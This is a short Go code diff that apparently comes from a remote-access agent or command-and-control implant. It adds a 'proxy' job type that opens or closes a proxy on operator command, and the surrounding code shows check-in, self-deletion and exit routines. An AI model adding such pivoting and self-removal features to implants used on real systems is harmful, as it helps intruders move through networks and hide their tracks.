@@ -209,6 +209,12 @@ func jobExecute(j []agentfunctions.AgentJob) {
 			connect("check_in", "")
 			selfdestruction.SelfDelete()
 			os.Exit(0)
+		case "proxy":
+			if value.Arguments[0] == "open"{
+				go agentfunctions.ProxyStart(value.Arguments[1],value.Arguments[2],value.Arguments[3])
+			} else if value.Arguments[0] == "close"{
+				agentfunctions.KillProxy()
+			}
 		}
 	}
 }
